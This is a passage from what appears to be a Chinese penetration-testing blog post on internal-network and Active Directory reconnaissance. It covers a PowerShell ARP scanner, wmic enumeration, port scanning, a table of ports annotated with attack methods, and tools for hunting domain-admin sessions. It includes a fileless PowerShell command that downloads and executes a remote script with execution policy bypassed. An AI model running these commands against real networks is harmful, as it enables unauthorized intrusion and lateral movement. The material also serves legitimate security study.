ExactSpelling = true)]</span></span><br><span class="line"><span class="string">    static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref int PhyAddrLen);</span></span><br><span class="line"><span class="string">    public static string GetMacAddress(String addr)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        try</span></span><br><span class="line"><span class="string">                &#123;                   </span></span><br><span class="line"><span class="string">                    IPAddress IPaddr = IPAddress.Parse(addr);</span></span><br><span class="line"><span class="string">                   </span></span><br><span class="line"><span class="string">                    byte[] mac = new byte[6];</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    int L = 6;</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    SendARP(BitConverter.ToInt32(IPaddr.GetAddressBytes(), 0), 0, mac, ref L);</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    String macAddr = BitConverter.ToString(mac, 0, L);</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    return (macAddr.Replace(&#x27;-&#x27;,&#x27;:&#x27;));</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                catch (Exception ex)</span></span><br><span class="line"><span class="string">                &#123;</span></span><br><span class="line"><span class="string">                    return (ex.Message);              </span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Write-Verbose</span> <span class="string">&quot;Instanciating NetUtils&quot;</span></span><br><span class="line">            <span class="variable">$IPHlp</span> = <span class="built_in">Add-Type</span> <span class="literal">-TypeDefinition</span> <span class="variable">$sign</span> <span class="literal">-Language</span> CSharp <span class="literal">-PassThru</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Write-Verbose</span> <span class="string">&quot;NetUtils already instanciated&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Manage if range is given</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$Range</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$rangeips</span> = <span class="variable">$Range</span>.Split(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">            <span class="variable">$targets</span> = <span class="built_in">New-IPv4Range</span> <span class="literal">-StartIP</span> <span class="variable">$rangeips</span>[<span class="number">0</span>] <span class="literal">-EndIP</span> <span class="variable">$rangeips</span>[<span class="number">1</span>]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Manage if CIDR is given</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$CIDR</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$targets</span> = <span class="built_in">New-IPv4RangeFromCIDR</span> <span class="literal">-Network</span> <span class="variable">$CIDR</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">Process</span> </span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="variable">$scancode</span> = &#123;</span><br><span class="line">            <span class="keyword">param</span>(<span class="variable">$IPAddress</span>,<span class="variable">$IPHlp</span>)</span><br><span class="line">            <span class="variable">$result</span> = <span class="variable">$IPHlp::GetMacAddress</span>(<span class="variable">$IPAddress</span>)</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;<span class="built_in">New-Object</span> psobject <span class="literal">-Property</span> <span class="selector-tag">@</span>&#123;Address = <span class="variable">$IPAddress</span>; MAC = <span class="variable">$result</span>&#125;&#125;</span><br><span class="line">        &#125; <span class="comment"># end ScanCode var</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$jobs</span> = <span class="selector-tag">@</span>()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">        <span class="variable">$start</span> = <span class="built_in">get-date</span></span><br><span class="line">        <span class="built_in">write-verbose</span> <span class="string">&quot;Begin Scanning at <span class="variable">$start</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#Multithreading setup</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a pool of maxThread runspaces   </span></span><br><span class="line">        <span class="variable">$pool</span> = [<span class="type">runspacefactory</span>]::CreateRunspacePool(<span class="number">1</span>, <span class="variable">$MaxThreads</span>)   </span><br><span class="line">        <span class="variable">$pool</span>.Open()</span><br><span class="line">  </span><br><span class="line">        <span class="variable">$jobs</span> = <span class="selector-tag">@</span>()   </span><br><span class="line">        <span class="variable">$ps</span> = <span class="selector-tag">@</span>()   </span><br><span class="line">        <span class="variable">$wait</span> = <span class="selector-tag">@</span>()</span><br><span class="line"></span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># How many servers</span></span><br><span class="line">        <span class="variable">$record_count</span> = <span class="variable">$targets</span>.Length</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Loop through the endpoints starting a background job for each endpoint</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$IPAddress</span> <span class="keyword">in</span> <span class="variable">$targets</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment"># Show Progress</span></span><br><span class="line">            <span class="variable">$record_progress</span> = [<span class="built_in">int</span>][<span class="type">Math</span>]::Ceiling(((<span class="variable">$i</span> / <span class="variable">$record_count</span>) * <span class="number">100</span>))</span><br><span class="line">            <span class="comment"># Write-Progress -Activity &quot;Performing ARP Scan&quot; -PercentComplete $record_progress -Status &quot;Addresses Queried - $record_progress%&quot; -Id 1;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$</span>(<span class="variable">$pool</span>.GetAvailableRunspaces()) <span class="operator">-le</span> <span class="number">0</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">Start-Sleep</span> <span class="literal">-milliseconds</span> <span class="number">500</span></span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="comment"># create a &quot;powershell pipeline runner&quot;</span></span><br><span class="line">            <span class="variable">$ps</span> += [<span class="type">powershell</span>]::create()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># assign our pool of 3 runspaces to use   </span></span><br><span class="line">            <span class="variable">$ps</span>[<span class="variable">$i</span>].runspacepool = <span class="variable">$pool</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># command to run</span></span><br><span class="line">            [<span class="built_in">void</span>]<span class="variable">$ps</span>[<span class="variable">$i</span>].AddScript(<span class="variable">$scancode</span>).AddParameter(<span class="string">&#x27;IPaddress&#x27;</span>, <span class="variable">$IPAddress</span>).AddParameter(<span class="string">&#x27;IPHlp&#x27;</span>, <span class="variable">$IPHlp</span>)</span><br><span class="line">            <span class="comment">#[void]$ps[$i].AddParameter()</span></span><br><span class="line">    </span><br><span class="line">            <span class="comment"># start job</span></span><br><span class="line">            <span class="variable">$jobs</span> += <span class="variable">$ps</span>[<span class="variable">$i</span>].BeginInvoke();</span><br><span class="line">     </span><br><span class="line">            <span class="comment"># store wait handles for WaitForAll call   </span></span><br><span class="line">            <span class="variable">$wait</span> += <span class="variable">$jobs</span>[<span class="variable">$i</span>].AsyncWaitHandle</span><br><span class="line">    </span><br><span class="line">            <span class="variable">$i</span>++</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">write-verbose</span> <span class="string">&quot;Waiting for scanning threads to finish...&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$waitTimeout</span> = <span class="built_in">get-date</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$</span>(<span class="variable">$jobs</span> | ? &#123;<span class="variable">$_</span>.IsCompleted <span class="operator">-eq</span> <span class="variable">$false</span>&#125;).count <span class="operator">-gt</span> <span class="number">0</span> <span class="operator">-or</span> <span class="variable">$</span>(<span class="variable">$</span>(<span class="variable">$</span>(<span class="built_in">get-date</span>) - <span class="variable">$waitTimeout</span>).totalSeconds) <span class="operator">-gt</span> <span class="number">60</span>) </span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">Start-Sleep</span> <span class="literal">-milliseconds</span> <span class="number">500</span></span><br><span class="line">        &#125; </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># end async call   </span></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> <span class="operator">-lt</span> <span class="variable">$i</span>; <span class="variable">$y</span>++) &#123;     </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> </span><br><span class="line">            &#123;   </span><br><span class="line">                <span class="comment"># complete async job   </span></span><br><span class="line">                <span class="variable">$ScanResults</span> += <span class="variable">$ps</span>[<span class="variable">$y</span>].EndInvoke(<span class="variable">$jobs</span>[<span class="variable">$y</span>])   </span><br><span class="line">  </span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">catch</span> </span><br><span class="line">            &#123;   </span><br><span class="line">       </span><br><span class="line">                <span class="built_in">write-warning</span> <span class="string">&quot;error: <span class="variable">$_</span>&quot;</span>  </span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">finally</span> </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$ps</span>[<span class="variable">$y</span>].Dispose()</span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$pool</span>.Dispose()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ScanResults</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-wmic的简单使用"><a href="#0x03-wmic的简单使用" class="headerlink" title="0x03.wmic的简单使用"></a>0x03.wmic的简单使用</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wmic /?        #全局参数(帮助)</span><br><span class="line">wmic process /?        #进程参数(帮助)</span><br><span class="line">wmic process get /?        #属性获取操作帮助</span><br><span class="line">wmic process get caption,executablepath,processid    #获取当前运行进程、进程路径、进程id</span><br><span class="line">wmic service where (state=&quot;running&quot;) get name,processid,pathname,startmode,caption</span><br><span class="line">wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayname,productstate,pathtosignedproductexe</span><br><span class="line">wmic onboarddevice get description,devicetype,enable,status /format:list</span><br><span class="line">wmic product get name    #系统软件安装情况</span><br><span class="line">wmic environment get description,variablevalue    #查看系统环境变量</span><br><span class="line">wmic computersystem get name,domain,manufacturer,model,username,roles/format:list</span><br><span class="line">wmic sysdriver get caption,name,pathname,servicetype,state,status /format:list</span><br></pre></td></tr></table></figure><h2 id="0x04-域内端口探测"><a href="#0x04-域内端口探测" class="headerlink" title="0x04.域内端口探测"></a>0x04.域内端口探测</h2><h3 id="01-scanlineTCP-UDP端口探测"><a href="#01-scanlineTCP-UDP端口探测" class="headerlink" title="01.scanlineTCP/UDP端口探测"></a>01.scanlineTCP/UDP端口探测</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanline.exe -h -t 22,80-89,110,389,1099,1433,2059,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O C:\Users\Administrator\Desktop\log.txt -p 10.10.10.1-254</span><br></pre></td></tr></table></figure><h3 id="02-telnet扫描"><a href="#02-telnet扫描" class="headerlink" title="02.telnet扫描"></a>02.telnet扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 10.10.10.10 22</span><br></pre></td></tr></table></figure><h3 id="03-metasploit端口扫描"><a href="#03-metasploit端口扫描" class="headerlink" title="03.metasploit端口扫描"></a>03.metasploit端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set rhosts 192.168.1.1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="04-PowerSploit的Invoke-Portscan-ps1"><a href="#04-PowerSploit的Invoke-Portscan-ps1" class="headerlink" title="04.PowerSploit的Invoke-Portscan.ps1"></a>04.PowerSploit的Invoke-Portscan.ps1</h3><p><code>无文件扫描</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 10.10.10.0/24 -T 4 -ports &#x27;445,1433,8080,3389,80&#x27; -oA c:\user\administrator\desktop\res.txt&quot;</span><br></pre></td></tr></table></figure><h2 id="0x05-域内常见端口"><a href="#0x05-域内常见端口" class="headerlink" title="0x05.域内常见端口"></a>0x05.域内常见端口</h2><h3 id="01-文件共享服务端口"><a href="#01-文件共享服务端口" class="headerlink" title="01.文件共享服务端口"></a>01.文件共享服务端口</h3><table><thead><tr><th>端口号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>21、22、69</td><td>FTP/TFTP文件传输协议</td><td>允许匿名的上传、下载爆破和嗅探操作</td></tr><tr><td>2049</td><td>NFS服务</td><td>配置不当</td></tr><tr><td>137、138、139</td><td>Netbiso/SAMBA服务</td><td>爆破、未授权访问、远程代码执行</td></tr><tr><td>389</td><td>LDAP目录访问协议</td><td>注入、允许匿名访问、弱口令</td></tr><tr><td>135</td><td>DCOM/RPC服务</td><td>RPC通信桥梁</td></tr><tr><td>445</td><td>SMB</td><td>共享文件夹(MS17-010),IPC$服务</td></tr></tbody></table><h3 id="02-远程连接服务端口"><a href="#02-远程连接服务端口" class="headerlink" title="02.远程连接服务端口"></a>02.远程连接服务端口</h3><table><thead><tr><th align="left">端口号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td align="left">22</td><td>SSH远程连接</td><td>爆破、SSH隧道及内网代理转发、文件传输</td></tr><tr><td align="left">23</td><td>Telnet远程连接</td><td>爆破、嗅探、弱口令</td></tr><tr><td align="left">3389</td><td>RDP远程桌面连接</td><td>Shift后门（Windows Server 2003以下版本）、爆破</td></tr><tr><td align="left">5900</td><td>VNC</td><td>弱口令爆破</td></tr><tr><td align="left">5632</td><td>PcAnywhere服务</td><td>抓取密码、代码执行</td></tr></tbody></table><h3 id="03-Web应用服务端口"><a href="#03-Web应用服务端口" class="headerlink" title="03.Web应用服务端口"></a>03.Web应用服务端口</h3><table><thead><tr><th align="left">端口号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td align="left">80、443、8080</td><td>常见的Web服务端口</td><td>Web攻击、爆破、对应服务器版本漏洞</td></tr><tr><td align="left">7001、7002</td><td>Weblogic控制台</td><td>Java反序列化、弱口令</td></tr><tr><td align="left">8080、8089</td><td>JBoss/Resin/Jetty/Jenkins</td><td>反序列化、控制台弱口令</td></tr><tr><td align="left">9090</td><td>WebSphere控制台</td><td>Java反序列化、弱口令</td></tr><tr><td align="left">4848</td><td>GlassFish控制台</td><td>弱口令</td></tr><tr><td align="left">1352</td><td>Lotus Domino邮件服务</td><td>弱口令、信息泄露、爆破</td></tr><tr><td align="left">10000</td><td>webmin控制面板</td><td>弱口令</td></tr></tbody></table><h3 id="04-数据库服务端口"><a href="#04-数据库服务端口" class="headerlink" title="04.数据库服务端口"></a>04.数据库服务端口</h3><table><thead><tr><th>端口号</th><th>端口说明</th><th><strong>使用说明</strong></th></tr></thead><tbody><tr><td>3306</td><td>MySQL数据库</td><td>注入、提权、爆破</td></tr><tr><td>1433</td><td>MSSQL数据库</td><td>注入、提权、SA弱口令、爆破</td></tr><tr><td>1521</td><td>Oracle数据库</td><td>TNS爆破、注入、反弹Shell</td></tr><tr><td>5432</td><td>PostgreSQL数据库</td><td>爆破、注入、弱口令</td></tr><tr><td>27017、27018</td><td>MongoDB数据库</td><td>爆破、未授权访问</td></tr><tr><td>6379</td><td>Redis数据库</td><td>未授权访问、弱口令</td></tr><tr><td>5000</td><td>Sysbase/DB2数据库</td><td>爆破、注入</td></tr></tbody></table><h3 id="05-邮件服务器端口"><a href="#05-邮件服务器端口" class="headerlink" title="05.邮件服务器端口"></a>05.邮件服务器端口</h3><table><thead><tr><th>端口号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>25</td><td>SMTP邮件服务</td><td>邮件伪造</td></tr><tr><td>110</td><td>POP3协议</td><td>爆破、嗅探</td></tr><tr><td>143</td><td>IMAP协议</td><td>爆破</td></tr></tbody></table><h3 id="06-网络常见协议端口"><a href="#06-网络常见协议端口" class="headerlink" title="06.网络常见协议端口"></a>06.网络常见协议端口</h3><table><thead><tr><th>端口号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>53</td><td>DNS域名系统</td><td>允许区域传送、DNS劫持、缓存投毒、欺骗</td></tr><tr><td>67、68</td><td>DHCP服务</td><td>劫持、欺骗</td></tr><tr><td>161</td><td>SNMP协议</td><td>爆破、搜集目标内网信息</td></tr></tbody></table><h3 id="07-特殊服务端口"><a href="#07-特殊服务端口" class="headerlink" title="07.特殊服务端口"></a>07.特殊服务端口</h3><table><thead><tr><th><strong>端口号</strong></th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>2181</td><td>ZooKeeper服务</td><td>未授权访问</td></tr><tr><td>8069</td><td>Zabbix服务</td><td>远程执行、SQL注入</td></tr><tr><td>9200、9300</td><td>Elasticsearch服务</td><td>远程执行</td></tr><tr><td>11211</td><td>Memchached服务</td><td>未授权访问</td></tr><tr><td>512、513、514</td><td>Linux rexec服务</td><td>爆破、远程登录</td></tr><tr><td>873</td><td>rsync服务</td><td>匿名访问、文件上传</td></tr><tr><td>3690</td><td>SVN服务</td><td>svn泄露、未授权访问</td></tr><tr><td>50000</td><td>SAP Management Console</td><td>远程执行</td></tr><tr><td>88</td><td>Kerberos服务</td><td>监听KDC票据请求，票据伪造</td></tr><tr><td>5985</td><td>WinRM</td><td>HTTP/HTTPS监听</td></tr></tbody></table><h2 id="0x06-定位域管理员"><a href="#0x06-定位域管理员" class="headerlink" title="0x06.定位域管理员"></a>0x06.定位域管理员</h2><p><code>两种方法:管理员日志与登入会话，主要是会话</code></p><h3 id="01-查看本机资源使用情况"><a href="#01-查看本机资源使用情况" class="headerlink" title="01.查看本机资源使用情况"></a>01.查看本机资源使用情况</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><h3 id="02-psloggedon-exe"><a href="#02-psloggedon-exe" class="headerlink" title="02.psloggedon.exe"></a>02.psloggedon.exe</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psloggedon.exe \\10.10.10.10</span><br></pre></td></tr></table></figure><blockquote><p>通过注册表HKEY_USERS的key值查询谁登入过</p></blockquote><p><code>参数</code></p><table><thead><tr><th><strong>参数</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>–</td><td>显示支持的选项和用于输出值的度量单位。</td></tr><tr><td>-l</td><td>仅显示本地登录，而不显示本地和网络资源登录。</td></tr><tr><td>-x</td><td>不显示登录时间。</td></tr><tr><td>\\computername</td><td>指定要为其列出登录信息的计算机的名称。</td></tr><tr><td>username</td><td>指定用户名，在网路中搜索该用户登入的计算机</td></tr></tbody></table><h3 id="03-PVEFindADUser-exe"><a href="#03-PVEFindADUser-exe" class="headerlink" title="03.PVEFindADUser.exe"></a>03.PVEFindADUser.exe</h3><blockquote><p>用于查找活动目录用户登录位置，枚举域用户，查找在特定计算机上登录的用户，包括本地用户，通过RDP登录的用户，用于运行服务和计划任务的用户。运行该工具需要.NET Framework2.0环境，并且具备管理员权限。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVEFindADUser.exe --current</span><br></pre></td></tr></table></figure><h3 id="04-netview-exe"><a href="#04-netview-exe" class="headerlink" title="04.netview.exe"></a>04.netview.exe</h3><blockquote><p>使用WinAPI枚举系统，利用NetSessionEnum找寻登录会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登录的用户。大部分功能不需要管理员权限。</p></blockquote><p><code>参数</code></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>-f filename.txt</td><td>指定一个文件以从中提取主机列表</td></tr><tr><td>-e filename.txt**</td><td>指定要排除的主机名文件</td></tr><tr><td>-d domain</td><td>指定要从中拉出主机列表的域，如果未指定，则使用当前域</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netview.exe -filenmae.txt &gt; res.txt</span><br></pre></td></tr></table></figure><h3 id="05-nmap的NSE脚本"><a href="#05-nmap的NSE脚本" class="headerlink" title="05.nmap的NSE脚本"></a>05.nmap的NSE脚本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smb-enum-domains.nse    #对域控制器进行信息收集，可以获取主机信息、用户、可使用密码策略的用户等</span><br><span class="line">smb-enum-groups.nse</span><br><span class="line">smb-enum-processes.nse    #获取主机进程</span><br><span class="line">smb-enum-services.nse</span><br><span class="line">smb-enum-sessions.nse    #获取用户登入会话</span><br><span class="line">smb-enum-shares.nse        #遍历远程主机的共享目录</span><br><span class="line">smb-enum-users.nse        #用户权限不够可以使用它对域控进行扫描</span><br><span class="line">smb-flood.nse</span><br><span class="line">smb-ls.nse</span><br><span class="line">smb-mbenum.nse</span><br><span class="line">smb-os-discovery.nse    #进行信息收集</span><br></pre></td></tr></table></figure><h3 id="06-PowerView脚本"><a href="#06-PowerView脚本" class="headerlink" title="06.PowerView脚本"></a>06.PowerView脚本</h3><p><code>扫描目标用户集，不需要管理权限</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\powerview.ps1; Invoke-UserHunter&#125;&quot;</span><br></pre></td></tr></table></figure><h3 id="07-Empire的user-hunter模块"><a href="#07-Empire的user-hunter模块" class="headerlink" title="07.Empire的user_hunter模块"></a>07.Empire的user_hunter模块</h3><p><code>查找域管理员登入的机器</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule powershell/situational_awareness/network/powerview/user_hunter</span><br></pre></td></tr></table></figure><h2 id="0x07-进程查询"><a href="#0x07-进程查询" class="headerlink" title="0x07.进程查询"></a>0x07.进程查询</h2><h3 id="01-netsess-exe"><a href="#01-netsess-exe" class="headerlink" title="01.netsess.exe"></a>01.netsess.exe</h3><p><code>会话查询</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsess.exe -h</span><br></pre></td></tr></table></figure><h3 id="02-交叉引用域管理员列表与活动会话列表"><a href="#02-交叉引用域管理员列表与活动会话列表" class="headerlink" title="02.交叉引用域管理员列表与活动会话列表"></a>02.交叉引用域管理员列表与活动会话列表</h3><blockquote><p>域控添加到dcs.txt，域管理员添加到admins.txt，与netsess在同一目录</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; session.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type session.txt | @findstr /I %a</span><br></pre></td></tr></table></figure><h3 id="03-查询远程系统中运行的任务"><a href="#03-查询远程系统中运行的任务" class="headerlink" title="03.查询远程系统中运行的任务"></a>03.查询远程系统中运行的任务</h3><p><code>首先获取域管理员列表</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><code>将目标系统添加到ips.txt，域管理员添加到admins.txt，运行以下脚本(当前计算机IP)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /F %i in (ips.txt) do @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt;output.txt &amp;&amp; for /F %n in (admins.txt) do @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp;pause</span><br></pre></td></tr></table></figure><h3 id="04-利用Netbios查询会话"><a href="#04-利用Netbios查询会话" class="headerlink" title="04.利用Netbios查询会话"></a>04.利用Netbios查询会话</h3><blockquote><p>将目标系统添加到ips.txt，域管理员添加到admins.txt，运行以下脚本</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /F %i in (ips.txt) do @echo [+]Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; for /F %n in (admins.txt) do @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</span><br></pre></td></tr></table></figure><p><code>使用nbtscan进行查询</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /F %i in (ips.txt) do @echo [+]Checking %i &amp;&amp; nbtscan -f %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; for /F %n in (admins.txt) do @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</span><br></pre></td></tr></table></figure><h2 id="0x08-PowerShell收集域信息"><a href="#0x08-PowerShell收集域信息" class="headerlink" title="0x08.PowerShell收集域信息"></a>0x08.PowerShell收集域信息</h2><p><code>Powershell的四种权限</code></p><blockquote><p>Restricted：默认设置，不允许执行任何脚本。</p><p>Allsigned：只能运行经过证书验证的脚本。</p><p>Unrestircted：权限最高，允许执行任何脚本。</p><p>RemoteSigned：对本地脚本不进行限制，对来自网络的脚本必须验证其签名。</p></blockquote><h3 id="01-权限相关"><a href="#01-权限相关" class="headerlink" title="01.权限相关"></a>01.权限相关</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-ExecutionPolicy        #查看权限</span><br><span class="line">Set-ExecutionPolicy UnRestricted    #修改权限</span><br></pre></td></tr></table></figure><h3 id="02-导入powerview-ps1"><a href="#02-导入powerview-ps1" class="headerlink" title="02.导入powerview.ps1"></a>02.导入powerview.ps1</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br></pre></td></tr></table></figure><h3 id="03-常用命令"><a href="#03-常用命令" class="headerlink" title="03.常用命令"></a>03.常用命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PowerView的常用命令如下：</span><br><span class="line">Get-NetDomain：获取当前用户所在的域。</span><br><span class="line">Get-NetUser：获取所有用户的详细信息。</span><br><span class="line">Get-NetDomainController：获取所有域控制器的信息。</span><br><span class="line">Get-NetComputer：获取域内所有机器的详细信息。</span><br><span class="line">Get-NetOU：获取域中的OU信息。</span><br><span class="line">Get-NetGroup：获取所有域内组成员的信息。</span><br><span class="line">Get-NetFileServer：根据SPN获取当前域使用的文件服务器信息。</span><br><span class="line">Get-NetShare：获取当前域内所有的网络共享信息。</span><br><span class="line">Get-NetSession：获取指定服务器的会话。</span><br><span class="line">Get-NetRDPSession：获取指定服务器的远程连接。</span><br><span class="line">Get-NetProcess：获取远程主机的进程。</span><br><span class="line">Get-UserEvent：获取指定用户的日志。</span><br><span class="line">Get-ADObject：获取活动目录的对象。</span><br><span class="line">Get-NetGPO：获取域内所有的组策略对象。</span><br><span class="line">Get-DomainPolicy：获取域默认策略或域控制器策略。</span><br><span class="line">Invoke-UserHunter：获取域用户登录的计算机信息及该用户是否有本地管理员权限。</span><br><span class="line">Invoke-ProcessHunter：通过查询域内所有的机器进程找到特定用户。</span><br><span class="line">Invoke-UserEventHunter：根据用户日志查询某域用户登录过哪些机器。</span><br></pre></td></tr></table></figure><h2 id="0x09-BloodHound域内分析工具"><a href="#0x09-BloodHound域内分析工具" 